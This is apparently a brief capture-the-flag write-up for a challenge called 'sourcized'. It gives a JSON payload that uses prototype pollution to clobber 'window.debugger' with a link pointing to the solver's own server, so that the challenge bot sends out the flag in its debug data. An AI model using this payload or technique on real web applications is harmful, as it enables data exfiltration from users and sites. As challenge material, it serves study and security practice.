# Solve for sourcized

## Step 1
First we need to create a working payload paper
```json
{
    "title": "",
    "content": "",
    "links": [
        {
            "name": "",
            "href": "<our server>",
            "attributes": {
                "__proto__[id]": "debugger"
            }
        }
    ]
}
```

This works by doing a prototype injection which will inject so that `id=debugger` is set. This means that our link which has the FLAG as defaultId will have the id `debugger` instead of the defaultId. Thus, when the page searches for `window.debugger` it will find our `anchor` element. That element will have the `href` attribute set to our server. This will make the bot send debug information to our server. The debug information will contain the `defaultId` which is a base64 encoded version of the flag.

## Step 2

Encode the payload and send it to the bot. The bot will then send the debug information to our server. The debug information will contain the `defaultId` which is a base64 encoded version of the flag. We can then decode the `defaultId` to get the flag.

Easy way run solve.py with all the values filled in.
